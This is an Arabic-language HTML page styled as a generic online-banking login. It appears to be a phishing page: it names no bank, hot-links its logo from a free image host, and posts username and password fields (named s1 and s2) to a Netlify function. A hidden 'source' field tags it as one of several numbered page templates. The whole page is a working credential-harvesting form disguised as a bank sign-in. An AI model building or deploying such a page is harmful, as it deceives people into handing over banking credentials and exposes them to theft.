<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى الخدمات المصرفية عبر الإنترنت</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f2f6fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            margin: 0 auto;
        }
        
        .logo-container {
            display: flex;
            justify-content: flex-end;
            margin: 20px 0 30px;
        }
        
        .logo {
            width: 70px;
            height: auto;
        }
        
        .login-title {
            text-align: right;
            margin-bottom: 40px;
        }
        
        .login-title h1 {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }
        
        .login-title span {
            font-size: 24px;
            font-weight: bold;
            color: #70b047;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .form-control {
            width: 100%;
            background-color: white;
            border: none;
            border-radius: 5px;
            padding: 16px;
            font-size: 16px;
            color: #333;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
            border-right: 4px solid #70b047;
        }
        
        .form-control::placeholder {
            color: #aaa;
            text-align: right;
        }
        
        .language-selector {
            width: 100%;
            background-color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        
        .language-label {
            padding: 10px 16px;
            color: #aaa;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }
        
        .language-label::after {
            content: "▼";
            display: inline-block;
            font-size: 12px;
            color: #333;
        }
        
        .language-label span.required {
            color: #ff0000;
        }
        
        .selected-language {
            padding: 5px 16px 16px;
            color: #333;
            font-weight: bold;
        }
        
        .btn-login {
            width: 100%;
            background-color: #70b047;
            color: white;
            border: none;
            border-radius: 50px;
            padding: 18px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 40px;
            box-shadow: 0 4px 10px rgba(112, 176, 71, 0.3);
        }
        
        .forgot-links {
            margin-top: 20px;
            text-align: right;
        }
        
        .forgot-link {
            color: #70b047;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://www2.0zz0.com/2025/05/13/13/778008753.png" alt="الشعار" class="logo">
        </div>
        
        <div class="login-title">
            <h1>تسجيل الدخول إلى</h1>
            <span>الخدمات المصرفية عبر الإنترنت</span>
        </div>
        
        <form action="/.netlify/functions/submit-login" method="post" class="login-form" id="loginForm">
            <input type="hidden" name="source" value="Online Banking Services (6.html)">
            <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم" required>
            <input name="s2" type="password" class="form-control" placeholder="كلمة المرور" required>
            
            <div class="forgot-links">
                <a href="#" class="forgot-link">نسيت معرف المستخدم؟</a>
            </div>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>

    
</body>
</html>
